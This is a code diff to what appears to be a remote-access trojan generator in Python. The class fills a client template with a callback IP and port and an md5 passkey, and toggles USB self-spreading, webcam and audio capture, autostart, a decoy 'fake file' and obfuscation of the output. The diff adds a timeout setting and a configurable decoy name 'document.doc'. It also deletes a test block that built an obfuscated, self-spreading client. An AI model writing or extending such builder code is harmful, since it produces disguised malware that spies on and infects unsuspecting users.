@@ -13,15 +13,16 @@ class SourceGenerator:
     fake_file =     False
     ip_address =    '127.0.0.1'
     port =          '4434'
+    timeout =       '10'
     passkey =       '1705a7f91b40320a19db18912b72148e'
     filename =      'auto_update'
-    working_dir =   'iDocuments'
+    working_dir =   'iDocuments',
+    fake_name =     'document.doc'
 
     def __init__(self):
         pass
 
     def generate_source(self, path):
-        print self.filename
         self.source = client_source.source
         source_file = open(path, 'w')
         source_file.write(self.format_source(self.source))
@@ -35,6 +36,7 @@ class SourceGenerator:
             '{%vidcapImport%}': 'import vidcap' if self.webcam else "web_camera = 'NoDevice'",
             '{%ip_address%}': self.ip_address,
             '{%port_number%}': self.port,
+            '{%connection_timeout%}': self.timeout,
             '{%md5key%}': self.passkey,
             '{%filename%}': self.filename,
             '{%get_webcam_device%}': client_snippets.get_webcam_device if self.webcam else '',
@@ -44,6 +46,7 @@ class SourceGenerator:
             '{%audio_streaming_class%}': client_snippets.audio_streaming_class if self.audio else '',
             '{%usb_spreading_class%}': client_snippets.usb_spreading_class if self.usb_spreading else '',
             '{%openFakeFile%}': client_snippets.open_fake_file if self.fake_file else '',
+            '{%fake_file_name%}': self.fake_name,
             '{%usbSpreading%}': client_snippets.usb_spreading_on if self.usb_spreading else '',
             '{%elseStatement%}': client_snippets.run_client_if_startup_on if self.autostart else client_snippets.run_client_if_statup_off,
         }
@@ -69,6 +72,9 @@ class SourceGenerator:
     def set_port(self, port):
         self.port = port
 
+    def set_timeout(self, timeout):
+        self.timeout = timeout
+
     def set_passkey(self, passkey):
         self.passkey = passkey
 
@@ -78,21 +84,12 @@ class SourceGenerator:
     def set_working_dir_name(self, working_dir_name):
         self.working_dir = working_dir_name
 
+    def set_fake_file_name(self, fake_name):
+        self.fake_name = fake_name
+
     def format_source(self, source):
         snippets = self.generate_snippets()
         return reduce(lambda x, y: x.replace(y, snippets[y]), snippets, source)
 
     def obfuscate(self, __path):
         pyobfuscator.main(__path)
-
-
-# Tests
-a = SourceGenerator()
-a.use_audio(True)
-a.use_autostart(True)
-a.use_usb_spreading(True)
-a.use_fake_file(True)
-a.set_working_dir_name('apple')
-a.set_file_name('update_generator')
-a.generate_source('source2.py')
-a.obfuscate(a.generated_source_file)
